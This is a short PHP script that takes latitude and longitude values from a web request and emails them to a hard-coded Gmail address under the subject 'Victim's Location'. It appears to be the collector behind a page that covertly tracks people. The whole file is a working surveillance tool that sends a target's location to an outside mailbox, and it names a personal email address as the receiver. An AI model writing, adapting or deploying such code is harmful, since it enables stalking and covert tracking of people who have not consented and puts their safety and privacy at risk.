<?php
$to = "zharlem3@gmail.com";
$subject = "Victim's Location";
$message = "Latitude: " . $_GET['latitude'] . "\nLongitude: " . $_GET['longitude'];
$headers = "From: zharlem3@gmail.com" . "\r\n" .
           "Reply-To: zharlem3@gmail.com" . "\r\n" .
           "X-Mailer: PHP/" . phpversion();

mail($to, $subject, $message, $headers);
?>
